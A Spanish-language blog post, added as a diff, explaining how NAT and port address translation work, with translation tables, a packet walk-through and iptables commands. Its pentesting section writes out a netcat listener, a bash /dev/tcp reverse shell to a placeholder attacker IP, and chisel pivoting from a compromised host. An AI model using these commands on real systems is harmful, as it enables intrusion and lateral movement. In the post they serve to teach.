@@ -1,0 +1,241 @@
+---
+title: "NAT: cómo una sola IP pública sirve a toda una red"
+date: 2026-03-04
+excerpt: "IPv4 tiene ~4 mil millones de direcciones y hay muchos más dispositivos. NAT resuelve eso dejando que toda una red comparta una sola IP pública — traduciendo direcciones y puertos en cada conexión."
+tags: ["net", "fundamentos"]
+series: network-essentials
+usefulFor:
+  - { area: "fundamentos de red", pct: 90 }
+  - { area: "análisis de tráfico", pct: 65 }
+  - { area: "pentesting", pct: 70 }
+draft: false
+---
+
+import Callout from '../../components/Callout.astro';
+import ProtoCard from '../../components/ProtoCard.astro';
+import Step from '../../components/Step.astro';
+
+IPv4 soporta ~4.300 millones de direcciones únicas. Suena a mucho, pero con smartphones, laptops, cámaras, routers, TVs y heladeras conectados, ese espacio se agotó. NAT fue la solución práctica que le dio décadas más de vida a IPv4.
+
+<ProtoCard
+  name="NAT"
+  description="Network Address Translation — técnica que permite que múltiples dispositivos con IPs privadas compartan una sola IP pública. El router NAT mantiene una tabla de traducción y reescribe las cabeceras IP y TCP/UDP en cada paquete que pasa."
+  layer="Red (L3) / Transporte (L4)"
+  facts={[
+    { label: "RFC",             value: "3022"                             },
+    { label: "Tipo más común",  value: "PAT / NAPT",     highlight: true  },
+    { label: "Tracking",        value: "IP + puerto"                      },
+    { label: "IPs privadas",    value: "RFC 1918",       highlight: true  },
+    { label: "Stateful",        value: "Sí — mantiene tabla"             },
+    { label: "NAT en IPv6",     value: "No necesario"                    },
+  ]}
+/>
+
+---
+
+## 🏠 IPs privadas vs IPs públicas
+
+El estándar RFC 1918 reservó tres rangos de IPs exclusivamente para redes privadas. Estos rangos **no se enrutan en Internet** — ningún router de backbone los reenvía:
+
+| Rango | CIDR | Hosts disponibles |
+|-------|------|-------------------|
+| `10.0.0.0` – `10.255.255.255` | `/8` | ~16 millones |
+| `172.16.0.0` – `172.31.255.255` | `/12` | ~1 millón |
+| `192.168.0.0` – `192.168.255.255` | `/16` | ~65 mil |
+
+Cualquier empresa, hogar o laboratorio puede usar estos rangos libremente sin coordinar con nadie. El truco: al salir a Internet, NAT reemplaza esas IPs privadas por la IP pública del router.
+
+---
+
+## 🔄 Cómo funciona NAT (PAT)
+
+El tipo más común es **PAT (Port Address Translation)**, también llamado NAPT o *masquerading*. Un solo router con una IP pública sirve a toda la red interna diferenciando conexiones por **puerto de origen**.
+
+```
+Red interna (privada)           Router NAT                Internet
+                                192.168.0.1 / 212.3.4.5
+┌──────────────────┐                   │
+│ Laptop           │                   │
+│ 192.168.0.129    │───────────────────┤──────────────────→ Web server
+│ puerto src 15401 │                   │  IP pública: 212.3.4.5
+└──────────────────┘           ┌───────────────┐          puerto NAT: 19273
+                               │  Tabla NAT    │
+┌──────────────────┐           │ .129:15401 ↔ :19273 │
+│ PC               │           │ .137:27912 ↔ :32759 │
+│ 192.168.0.137    │───────────│ .112:38192 ↔ :41251 │
+│ puerto src 27912 │           └───────────────┘
+└──────────────────┘
+```
+
+### La tabla de traducción
+
+| Red interna (IP:puerto) | Red externa (IP:puerto) |
+|-------------------------|-------------------------|
+| `192.168.0.129`, 15401 | `212.3.4.5`, 19273 |
+| `192.168.0.137`, 27912 | `212.3.4.5`, 32759 |
+| `192.168.0.112`, 38192 | `212.3.4.5`, 41251 |
+
+El servidor en Internet solo ve `212.3.4.5` — nunca sabe que hay tres dispositivos distintos detrás.
+
+---
+
+## 📦 El viaje de un paquete a través de NAT
+
+<Step n={1} title="Paquete sale de la red interna">
+  La laptop `192.168.0.129` abre una conexión TCP al servidor web en el puerto 80.
+  Puerto de origen elegido por el OS: `15401`.
+
+  ```
+  IP src:  192.168.0.129   puerto src: 15401
+  IP dst:  93.184.215.14   puerto dst: 80
+  ```
+</Step>
+
+<Step n={2} title="El router NAT reescribe la cabecera">
+  El router reemplaza la IP privada por su IP pública y asigna un puerto externo.
+  Guarda la asociación en su tabla NAT.
+
+  ```
+  IP src:  212.3.4.5       puerto src: 19273   ← reescrito
+  IP dst:  93.184.215.14   puerto dst: 80      ← sin cambio
+  ```
+</Step>
+
+<Step n={3} title="El servidor responde">
+  El servidor responde al único origen que conoce: `212.3.4.5:19273`.
+
+  ```
+  IP src:  93.184.215.14   puerto src: 80
+  IP dst:  212.3.4.5       puerto dst: 19273
+  ```
+</Step>
+
+<Step n={4} title="El router NAT traduce de vuelta" last={true}>
+  Busca `19273` en su tabla → corresponde a `192.168.0.129:15401`.
+  Reescribe la cabecera y entrega el paquete a la laptop.
+
+  ```
+  IP src:  93.184.215.14   puerto src: 80
+  IP dst:  192.168.0.129   puerto dst: 15401   ← restaurado
+  ```
+</Step>
+
+<Callout type="info">
+  El router NAT es **stateful**: mantiene la tabla mientras dure la conexión. Cuando la sesión TCP cierra (FIN/RST) o expira por timeout, elimina la entrada. Por eso las conexiones largas inactivas pueden cortarse detrás de un NAT.
+</Callout>
+
+---
+
+## 🗂️ Tipos de NAT
+
+### Static NAT
+Un dispositivo interno tiene siempre la misma IP pública asignada. Sirve para servidores internos que necesitan ser accesibles desde Internet con una IP fija.
+
+```
+192.168.0.10  ←→  203.0.113.10  (siempre)
+```
+
+### Dynamic NAT
+Un pool de IPs públicas se asigna dinámicamente. Cuando se agota el pool, nuevas conexiones se rechazan. Poco común hoy.
+
+### PAT / NAPT (el más común)
+Una sola IP pública, múltiples conexiones diferenciadas por puerto. Es lo que hace el router de tu casa y cualquier firewall corporativo.
+
+### Port Forwarding
+Variante de Static NAT a nivel de puerto: un puerto específico de la IP pública redirige siempre a un host interno.
+
+```
+212.3.4.5:22  →  192.168.0.10:22   (SSH al servidor interno)
+212.3.4.5:80  →  192.168.0.20:80   (web server interno)
+```
+
+<Callout type="tip">
+  El port forwarding es lo que hacés en tu router para hospedar un servidor desde casa. En pentesting, encontrar un puerto forwarded en un firewall es acceso directo a un host interno.
+</Callout>
+
+---
+
+## 🔒 Relevancia en pentesting
+
+**NAT como "firewall implícito":**
+
+NAT bloquea conexiones entrantes no solicitadas por defecto — si nadie desde adentro inició la conexión, el router no sabe a qué IP interna mandarlo. Esto da una falsa sensación de seguridad.
+
+**Identificar si un target está detrás de NAT:**
+
+```bash
+# La IP que ves en Shodan/nmap es la IP pública
+# El host real puede estar en 192.168.x.x / 10.x.x.x / 172.16-31.x.x
+
+# Si tenés acceso al host, verificá
+ip addr show          # IPs locales
+ip route show         # gateway → es el NAT
+curl ifconfig.me      # IP pública real
+```
+
+**NAT traversal en reverse shells:**
+
+Si el target está detrás de NAT, no podés conectarte directo a él — NAT bloquea las conexiones entrantes. Solución: **reverse shell** (el target conecta hacia vos).
+
+```bash
+# En tu máquina (IP pública o con ngrok)
+nc -lvnp 4444
+
+# En el target (reverse shell sale a través del NAT)
+bash -i >& /dev/tcp/TU_IP_PUBLICA/4444 0>&1
+```
+
+**Port forwarding interno — pivoting:**
+
+Si comprometiste un host detrás de NAT y querés exponer un servicio interno:
+
+```bash
+# Con chisel: forwardear puerto interno al exterior
+# En tu máquina (server)
+chisel server --reverse -p 8080
+
+# En el host comprometido (client)
+chisel client TU_IP:8080 R:3306:192.168.0.5:3306
+# Ahora tu localhost:3306 habla con la DB interna
+```
+
+<Callout type="warning">
+  NAT no es un firewall real — es un efecto secundario de la traducción. Un router NAT mal configurado con UPnP habilitado puede permitir que cualquier proceso interno abra puertos automáticamente hacia el exterior. Muchos malware aprovechan esto.
+</Callout>
+
+---
+
+## 🛠️ Comandos de referencia
+
+```bash
+# Ver IP privada
+ip addr show
+ip a
+
+# Ver IP pública
+curl ifconfig.me
+curl api.ipify.org
+
+# Ver tabla NAT en Linux (iptables)
+iptables -t nat -L -n -v
+
+# Configurar masquerading (NAT saliente) en Linux
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Port forwarding con iptables
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.20:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+
+# Ver conexiones activas (incluye estado NAT)
+ss -tunp
+conntrack -L          # tabla de conexiones del kernel (si está instalado)
+```
+
+```powershell
+# Windows: ver IP pública
+Invoke-RestMethod ifconfig.me
+
+# Ver conexiones activas con puertos
+netstat -ano
+```
